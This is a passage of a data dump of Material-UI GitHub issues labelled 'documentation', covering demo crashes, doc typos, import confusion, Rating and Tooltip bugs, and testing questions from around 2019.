documentation](https://material-ui.com/customization/color/#color-tool)\r\n\r\n(This is my first issue opened for `mui` so if this is duplicated / should not be raised here, please do let me know. Thanks. :-) )\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n    - I had searched for `documentation` and `color tool` - did not see anything that is very obvious\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\nError message is shown when possibly invalid input (e.g. `#`) is typed into the demo:\r\n```\r\nThis demo had a runtime error!\r\n\r\nWe would appreciate it if you report this error directly to our issue tracker.\r\n\r\nError: Material-UI: unsupported `` color.\r\nWe support the following formats: #nnn, #nnnnnn, rgb(), rgba(), hsl(), hsla()\r\n```\r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\nThe demo would not result in runtime error (e.g. maybe it can show a snack bar message indicating invalid input or we can add validation to the text field?)\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\nSteps:\r\n\r\n1. Go to the [Material-UI documentation page for `Color-tool`](https://material-ui.com/customization/color/#color-tool)\r\n2. Click on any of the text field (e.g. the `Primary` one)\r\n3. Press `#` on your keyboard (i.e. `shift-3`)\r\n4. The demo would fail and show the runtime error message\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.4.1  |\r\n| React       | The version used by the documentation as of 16-Sep-2019 |\r\n| Browser     |    Google Chrome 77.0.3865.75 (Official Build) (64-bit)     |\r\n| TypeScript  | The version used by the documentation as of 16-Sep-2019 |\r\n| etc.        |         |\r\n"},{"labels":["documentation",null],"text":"In the documentation, the dependency import of `makeStyles` [API page](https://material-ui.com/styles/api/#makestyles-styles-options-hook) states that it should be imported from `@material-ui/styles`:\r\n`import { makeStyles } from '@material-ui/styles';`\r\n\r\nBut on the [button page](https://material-ui.com/components/buttons/), it says it should be taken from the `'@material-ui/core/styles';`\r\n`import { makeStyles, createStyles, Theme } from '@material-ui/core/styles';`\r\n\r\nFor my test to work I'm using the latter one. \r\nCan you please unify the information in the documentation?"},{"labels":[null,"documentation",null],"text":"Recursive TreeView\r\n\r\nI would like to implement a recursive tree with drag and drop features. \r\n\r\nI have it mostly built and would like someone to check the code. \r\n\r\nHere is the recursive part. https://codesandbox.io/s/material-demo-woz8h\r\n\r\nI will share the drag and drop part soon. \r\n"},{"labels":[null,"documentation"],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\nThis issue may be related to [this one](https://github.com/mui-org/material-ui/issues/14366).\r\nBasically, when you fast scroll while a tooltip is being shown, the tooltip stays visible. This behavior produces the appearance of a scrollbar plus the fact that you see a non related tooltip.\r\n\r\nIn the issue I referenced above, this behavior seems to be solved using `PopperProps={{ disablePortal: true }}`. \r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\nIn my case, I am using this in a table and the problem is that I can't use this props because it breaks the structure of the table.\r\n\r\n![example](https://i.ibb.co/zQ224fM/tooltip-disabled-portal.gif)\r\n\r\n## Expected Behavior 🤔\r\n\r\nHide tooltip as soon as the trigger element is no more hovered by the cursor and avoid the appearance of a second scrollbar.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nSteps:\r\n\r\n1. Go to [CodeSandbox](https://codesandbox.io/s/material-demo-cc34s?fontsize=14)\r\n2. Scroll down to the last line\r\n3. Hover an element\r\n4. Scroll fast to the top\r\n5. You should see a 2nd scrollbar that appears.\r\n\r\n![code sandbox demo](https://i.ibb.co/zrbYCBR/tooltip-hover-bug-demo.gif)\r\n\r\n## Your Environment 🌎\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.4.1  |\r\n| React       |   16.9.0 |\r\n| Browser     |    Chrome|\r\n| TypeScript  | 3.7.0 |"},{"labels":[null,"documentation"],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [ ] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\nMore than two arguments slier component\r\n\r\nhttps://codesandbox.io/s/material-demo-x1pso\r\n## Expected Behavior 🤔\r\nTwo or fewer arguments are recognized\r\n\r\nStrictly speaking, it may not be a bug.\r\nIt is unlikely that I will use more than two element in a SliderComponent.\r\n\r\nhttps://codesandbox.io/s/xqcfl\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nhttps://codesandbox.io/s/material-demo-x1pso\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.3  |\r\n| React       | 16.8        |\r\n| Browser     | Chrome   |\r\n| TypeScript  |  3.5 |\r\n| etc.        |         |\r\n"},{"labels":[null,null,"documentation"],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Bug\r\nhttps://material-ui.com/components/autocomplete/#react-select\r\n\r\nthis tutorial contains errors. Open the sandbox and click on a element in the list.\r\n\r\nThe following is logged to the console:\r\n```\r\nWarning: Failed prop type: The prop `innerProps.key` is marked as required in `Option`, but its value is `undefined`.\r\nWarning: Failed prop type: The prop `innerRef` is marked as required in `Option`, but its value is `undefined`.\r\n```\r\n\r\nLink to sandbox: https://codesandbox.io/s/dcgb1\r\n\r\nTested on Linux in Chrome and Firefox"},{"labels":["documentation"],"text":"I don't think this the best place to write about this, but anyway it's a big issue for me. I can barely open pages of the website, my guess is it's probably hosting/cloud issue as I don't have similar problem with other websites and probably not a browser issue either(I use latest versions of Firefox, Opera, Chromium - os Manjaro linux KDE). My location is in Russia, somewhere in Siberia."},{"labels":["documentation",null],"text":"- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\nI understand how to use `theme.props`, but I do not see any clear indication of which component names to use. The docs on [Customization/Theming/Globals/Default props](https://material-ui.com/customization/globals/#default-props) gives this example:\r\n\r\n![image](https://user-images.githubusercontent.com/7766733/64063526-7c0a8100-cbf5-11e9-8e0a-90252d47de1e.png)\r\n\r\nI am confused, because as indicated by the [ButtonBase API docs](https://material-ui.com/api/button-base/), the component name is not `MuiButtonBase`, but `ButtonBase` (`import ButtonBase from '@material-ui/core/ButtonBase'`). The only mention of `MuiButtonBase` is the component's style sheet name (which is not present for all components, see #17244, so I doubt this is what's referred to in the screenshot above).\r\n\r\nIs it perhaps the case that \"component name\" in `theme.props` is the API docs component name prefixed by `Mui`, for all components? If so, can this be clearly stated somewhere?"},{"labels":[null,"documentation"],"text":"- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\nMy understanding is the stylesheet names that can be provided to `theme.overrides` are the stylesheet names specified in each component's API docs. For example, here in the Checkbox API docs:\r\n\r\n![image](https://user-images.githubusercontent.com/7766733/64063415-5761d980-cbf4-11e9-8b3e-279685956b4d.png)\r\n\r\nThe [Customization/Theming/Typography docs](https://material-ui.com/customization/typography/#self-host-fonts) says that:\r\n\r\n> In order to globally define Raleway as a font face the `CssBaseline` component needs to be used.\r\n\r\n![image](https://user-images.githubusercontent.com/7766733/64063474-e53dc480-cbf4-11e9-961d-787de99a8922.png)\r\n\r\nHowever, the [CssBaseline API docs](https://material-ui.com/api/css-baseline/) do not mention any style sheet name, so I'm confused whether my understanding is correct and this is a doc issue, or if the possible `overrides` style sheet names are in fact defined elsewhere (I haven't found anything).\r\n\r\nThis may be relevant for other components, too (there are quite a few whose API docs do not have the CSS heading and thus no stylesheet name)."},{"labels":[null,"documentation"],"text":"I'm new to React and Material-UI, coming from Vue and Vuetify. After reading docs for three times in a month, I'm still confused. It tells me many concepts I don't know, CSS in JS, style-components and since material-ui is divided to many packages, I even don't understand style/system/core's differences from beginning. \r\nI try to goole tutorials or YouTube videos, but I couldn't find even one that is clear and updated.\r\nI don't know if others feel the same as me, I feel overwhelmed. React is marching from class to hooks, there's tons of out-dated tutorials written in class. Apollo is marching to hooks, the same as React. Material-ui is marching to style-compoents and typescript. Oh, I don't know if React's develpers all are JS ninjas, it's really not user-friendly at all, maybe the community is a little too active, the big version boosts many times even in a year. \r\nVuetify's docs has seperated examples, each represents one prop's effect. I think it's very intuitive. I could easily compose them into new components. But Material-UI's doc only has a gigantic example which includes everything, I don't even know each prop's meaning, how could I understand the features when they are combined. I think most of time we won't need the same example as that in docs. When we copy the example, we even need to delete most of the example code. At least docs should offer seperated examples, I think, that could be much better."},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [X] The issue is present in the latest release.\r\n- [X] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n`material-ui-banner` uses `@material-ui/styles` for its style solution, requiring the installation of another ThemeProvider. See https://github.com/alexplumb/material-ui-banner/issues/5\r\n\r\nThere is a confusion as to whether libraries that use `material-ui` components should import from `@material-ui/core/styles` or `@material-ui/styles`. I believe it should import from `@material-ui/core/styles` to avoid having to install the theme twice (as `material-ui-pickers` does).\r\n\r\nhttps://material-ui.com/getting-started/faq/#i-have-several-instances-of-styles-on-the-page seems to say the same thing but could be more assertive in laying out the right solution for libraries.\r\n\r\n## Expected Behavior 🤔\r\n\r\nStart a new documentation page to provide best practices for libraries extending `material-ui`.\r\n\r\nClarify which of `@material-ui/core/styles` or `@material-ui/styles` should be used by libraries."},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x ] The issue is present in the latest release.\r\n- [x ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\nTypography's noWrap property does not work if `variant=\"inherit\"` is set.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\nHere's an example. The third element showcases the current broken behavior.\r\n\r\nhttps://codesandbox.io/s/material-demo-cmgiv?fontsize=14\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.3.3  |\r\n| React       |     16.9.0    |\r\n| Browser     |    Chrome     |\r\n| TypeScript  |     3.5.3    |\r\n"},{"labels":[null,"documentation"],"text":"- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n\r\nIn #17097 the `Popover.action` prop was changed from `object` to `func | object`, but no explanation exists for what the `object` actually is. I understand the `func` callback - you get an object with an `updatePosition()` member you can call. But what about `object`? I have no idea how that is used. This should be documented. :)"},{"labels":["documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [ x] The issue is present in the latest release.\r\n- [x ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\nHi, I'm using the Tabs component and passing all the props that I require using my own wrapper component. Everything is working fine except when I add scrollable prop to the component.\r\n```javascript\r\nconst returnScrollable = () => {\r\n  const [value, setValue] = useState(0);\r\n  const handleChange = (event, newValue) => {\r\n    setValue(newValue);\r\n  };\r\n\r\n  return (\r\n    <>\r\n      <Tabs\r\n        tabItems={tabItemsScrollable} //array of tabs\r\n        onChange={handleChange}\r\n        value={value}\r\n        variant=\"scrollable\"\r\n        scrollButtons=\"auto\"\r\n      />\r\n    </>\r\n  );\r\n};\r\n```\r\nThis works as it's supposed to be without any errors on the console but when I run tests through Jest of updating the snap-shots using storybook, I'm getting an error.\r\n\r\n`    Error: Uncaught [TypeError: Cannot read property 'offsetHeight' of null]`\r\n`Error: Uncaught [TypeError: Cannot read property 'scrollTop' of null]`\r\n````\r\nThe above error occurred in the <ScrollbarSize> component:\r\n        in ScrollbarSize (created by ForwardRef(Tabs))\r\n        in div (created by ForwardRef(Tabs))\r\n        in ForwardRef(Tabs) (created by WithStyles(ForwardRef(Tabs)))\r\n        in WithStyles(ForwardRef(Tabs)) (created by SBTabs)\r\n        in header (created by ForwardRef(Paper))\r\n        in ForwardRef(Paper) (created by WithStyles(ForwardRef(Paper)))\r\n        in WithStyles(ForwardRef(Paper)) (created by ForwardRef(AppBar))\r\n        in ForwardRef(AppBar) (created by WithStyles(ForwardRef(AppBar)))\r\n        in WithStyles(ForwardRef(AppBar)) (created by SBTabs)\r\n        in div (created by SBTabs)\r\n        in SBTabs (created by WithStyles(SBTabs))\r\n        in WithStyles(SBTabs) (created by BaseStoryScrollable)\r\n        in BaseStoryScrollable\r\n````\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\nThe tests should pass just like it does when the scrollable prop is not passed on the Tabs component.\r\n\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\nSteps:\r\n\r\n1. Create a component using Tabs and try Jest snap-shot testing it.\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.3.1  |\r\n| React       |     16.9.0    |\r\n| Browser     |  Chrome       |\r\n| TypeScript  |   NA      |\r\n| etc.        |         |\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [ ] The issue is present in the latest release.\r\n- [ ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\nChanging `anchorPosition.top` or `anchorPosition.left` in Anchor playground in https://material-ui.com/components/popover/\r\ngives this error `TypeError: n.target is null` after a few seconds\r\n<!-- Describe what happens instead of the expected behavior. -->\r\n\r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\nSteps:\r\n\r\n1.\r\n2.\r\n3.\r\n4.\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.?.?  |\r\n| React       |         |\r\n| Browser     |         |\r\n| TypeScript  |         |\r\n| etc.        |         |\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [**correct** ] The issue is present in the latest release.\r\n- [**Not yet** ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nstring instead of spring\r\n\r\n## Expected Behavior 🤔\r\n\r\nshould spells as spring\r\n\r\n## Steps to Reproduce 🕹\r\n\r\nSteps:\r\n\r\n1. open the Modal Docs\r\n2. scroll down spot react-spring button\r\n3. hit that hard\r\n4. Modal will show up tells you \"string\" cmiw -)\r\n\r\n## Context 🔦\r\n\r\n<!--\r\nWhat are you trying to accomplish? **Nothing**\r\n\r\nHow has this issue affected you? **Not at all**\r\n\r\nProviding context helps us come up with a solution that is most useful in the real world. **I agree**\r\n-->\r\n\r\n## Your Environment 🌎\r\n\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.3.3  |\r\n| React       |    Latest     |\r\n| Browser     |     Brave    |\r\n| TypeScript  |    Javascript Better     |\r\n| Laptop        |    The Most Expensive Dell Brand    |\r\n"},{"labels":[null,"documentation"],"text":"- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\nThe text description for `getLabelText` indicates that the formatter should have signature `function(value: number) => string`, but the documented signature is `function(value: number) => void`."},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\nWhen rendering multiple rating components, change the state on one only changes state of first rendered.\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [ x] The issue is present in the latest release.\r\n- [x ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n<!-- Describe what happens instead of the expected behavior. -->\r\nIf rendering multiple Rating components, Using onChange to change state of Rating only changes state of first rendered. \r\n## Expected Behavior 🤔\r\n\r\n<!-- Describe what should happen. -->\r\nRating component should only change its own state.\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\nhttps://codesandbox.io/embed/determined-mcclintock-msbud?fontsize=14\r\nSteps:\r\n\r\n1. Change rating of any MUI Rating labeled rating components\r\n2. Observe state of first rendered rating component.\r\n3. I have included Team Wertarbyte Rating component to show expected behavior.\r\n4.\r\n\r\n## Context 🔦\r\n\r\n<!--\r\n  What are you trying to accomplish? How has this issue affected you?\r\n  Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nI am rendering multiple user tiles each with a rating component on it. When changing the state of any of them, it only changes the state of the first rendered.\r\n\r\n## Your Environment 🌎\r\n\r\n<!--\r\n  Include as many relevant details about the environment with which you experienced the bug.\r\n  If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.3.1  |\r\n| Material-UI Lab | v4.0.0-alpha.23  |\r\n| React       |   v.16.9.0      |\r\n| Browser     |  newest firefox |\r\n| TypeScript  |     n/a    |\r\n| etc.        | react-hooks |\r\n"},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\nI am trying to paste the primary color from some place and color tool is crashing.\r\n\r\n- [X ] The issue is present in the latest release.\r\n- [ X] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\n[crash screenshot](https://ibb.co/fFwdQ95)\r\n\r\n## Expected Behavior 🤔\r\n\r\nNot crash\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n<!--\r\n  Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n  Include code to reproduce, if relevant (which it most likely is).\r\n\r\n  This codesandbox.io template _may_ be a good starting point:\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n  If you're using typescript a better starting point would be\r\n  https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n  If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n-->\r\n\r\nSteps:\r\n\r\n1. paste any color in color tool\r\n\r\n## Your Environment 🌎\r\n\r\n| Tech        | Version |\r\n| ----------- | ------- |\r\n| Material-UI | v4.?.?  |\r\n| React       |         |\r\n| Browser     |         |\r\n| TypeScript  |         |\r\n| Demo site      |   TRUE      |\r\n"},{"labels":[null,"documentation",null],"text":"Hello,\r\n\r\nI've an issue while reading the documentation of material-ui:\r\n\r\nhttps://material-ui.com/guides/testing/#createmount-options-mount \r\n\r\nI can't fully understand how to write my tests with custom styles and with this exemple:\r\n\r\n```js\r\nimport { createMount } from '@material-ui/core/test-utils';\r\nimport { MuiThemeProvider } from '@material-ui/core/styles';\r\n\r\ndescribe('<MyComponent />', () => {\r\n  let mount;\r\n\r\n  function MySuccessButton({ children }) {\r\n    return (\r\n      <MuiThemeProvider theme={{ success: { main: '#fff' } }}>\r\n        {children}\r\n      </MuiThemeProvider>\r\n    );\r\n  }\r\n\r\n  before(() => {\r\n    mount = createMount();\r\n  });\r\n\r\n  after(() => {\r\n    mount.cleanUp();\r\n  });\r\n\r\n  it('should work', () => {\r\n    const wrapper = mount(<MockedTheme><MySuccessButton /></MockedTheme>);\r\n  });\r\n});\r\n```\r\n\r\nHere is some questions:\r\n\r\n* What is MockedTheme, how and where is it ?\r\n* Where `MyComponent` should be mounted ?\r\n* Did you plan for a TypeScript version of your tests ?\r\n\r\nWhile testing, I ran into this issue:\r\n\r\n``\r\nError: Uncaught [TypeError: theme.spacing is not a function]\r\n``\r\n\r\nThank you for your help !"},{"labels":["documentation",null],"text":"When you apply a custom color to the material-ui docs, it is saved for each visit. \r\n\r\nThe experience isn't really great though, because the color first shows the original blue, and jumps to the custom color after ~500ms.\r\n\r\nIt'd be nice if it would load with the proper color from the start."},{"labels":[null,"documentation",null],"text":"<!-- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n  Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n  To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\nCodeSandbox demos for the date-pickers contain dependency errors. [Demo](https://codesandbox.io/s/5xwtq)\r\n\r\nhttps://material-ui.com/components/pickers/#material-ui-pickers"},{"labels":[null,"documentation",null],"text":"There seems to be an error in the [CircularProgress docs](https://material-ui.com/api/circular-progress/). The `size` prop says it can be a number or a string. But setting a string value seems to have no effect on the size. Only a number works."},{"labels":[null,"documentation",null],"text":"The word 'number' has been misspelled as 'umber' in https://material-ui.com/api/textarea-autosize/#props under rows.\r\n"},{"labels":["documentation",null],"text":"Following #6115, I think that we should migrate all our demos to use the Box component or styled-component. The goal is to hide `@material-ui/styles` as much as possible. [styled-components keeps growing]( https://www.rank2traffic.com/styled-components.com), a consolidation of this styling solution will be better, overall, for the React community.\r\n\r\nRegarding the timing, I think that we can start to use the Box component now. For the demos that we can't migrate, we probably want to wait for the first proof of concept with #6115."},{"labels":[null,"documentation",null],"text":"Based on the discussion for ExpansionPanel: https://github.com/mui-org/material-ui/issues/10569 the contents of the `Collapse` element should also be in the DOM before it is expanded. For SEO reasons and the other reasons outlined in that thread.\r\n\r\n- [x] The issue is present in the latest release.\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Current Behavior 😯\r\n\r\nThe [Card component demo](https://material-ui.com/components/cards/#complex-interaction) uses `Collapse` and the content of the collapse does not appear in the DOM until it is expanded.\r\n\r\n## Expected Behavior 🤔\r\n\r\nThe `Collapse` element should render the content in the DOM like the ExpansionPanel does: https://material-ui.com/components/expansion-panels/#performance\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n[Card component demo](https://material-ui.com/components/cards/#complex-interaction)"},{"labels":[null,"documentation",null],"text":"Like the title says, when you have a precision of 0.2 and value of 3.9, there are only 3 starts filled instead of 4. \r\n\r\nThe following code:\r\n```jsx\r\nimport React from 'react';\r\nimport Rating from '@material-ui/lab/Rating';\r\n\r\nexport default function HalfRating() {\r\n  return (\r\n    <div>\r\n      <Rating name=\"half-rating-1\" value={3.6} precision={0.2} />\r\n      <Rating name=\"half-rating-2\" value={3.9} precision={0.2} />\r\n    </div>\r\n  );\r\n}\r\n\r\n```\r\nProduces:\r\n![image](https://user-images.githubusercontent.com/5186871/62740352-3b0bbc00-b9fd-11e9-8c46-2ac5eb4bcd15.png)\r\n\r\nFirst one is supposed to be less stars than second one.\r\n\r\nExample here:\r\nhttps://codesandbox.io/s/material-demo-f25jl?fontsize=14\r\n"},{"labels":["documentation"],"text":"Can we add the transition creator from the theme into the docs? I see quite a lot of questions on stack overflow on how to add a transition with _createStyles/makeStyles_. The docs do not mention it and there is only one [medium article](https://medium.com/@octaviocoria/custom-css-transitions-with-react-material-ui-5d41cb2e7c5) which covers it. I think, it would be good to add it into the docs, so that everybody can find it more easily.\r\n\r\n<!-- Checked checkbox should look like this: [x] 